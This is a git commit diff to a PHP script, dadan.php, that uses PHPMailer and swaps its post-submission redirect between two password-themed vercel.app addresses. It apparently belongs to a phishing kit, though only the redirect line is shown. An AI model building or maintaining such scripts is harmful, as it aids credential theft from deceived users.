66a6e940aa4f1b885db3a2d5b20af207d36b9db9
kameronjustine234 <kameronjustine234@gmail.com>
2025-07-13 02:17:30 +0500

    Update dadan.php

--- dadan.php
+++ dadan.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://aprove-her-pass.vercel.app/");
+header("Location: https://pass-support.vercel.app/");
 
 require 'Exception.php';
 require 'PHPMailer.php';
